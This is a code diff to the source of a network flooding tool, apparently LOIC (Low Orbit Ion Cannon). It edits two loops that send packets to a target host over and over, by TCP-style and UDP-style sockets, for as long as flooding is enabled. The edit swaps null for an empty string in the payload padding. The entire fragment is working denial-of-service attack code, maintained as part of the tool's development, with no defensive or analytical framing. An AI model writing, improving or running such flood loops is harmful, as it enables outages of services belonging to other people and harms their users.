@@ -59,7 +59,7 @@ namespace LOIC
 								while (IsFlooding)
 								{
 									FloodCount++;
-									buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null)));
+									buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
 									socket.Send(buf);
 									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
 								}
@@ -77,7 +77,7 @@ namespace LOIC
 								while (IsFlooding)
 								{
 									FloodCount++;
-									buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : null)));
+									buf = System.Text.Encoding.ASCII.GetBytes(String.Concat(Data, (AllowRandom ? Functions.RandomString() : "")));
 									socket.SendTo(buf, SocketFlags.None, RHost);
 									if (Delay >= 0) System.Threading.Thread.Sleep(Delay + 1);
 								}
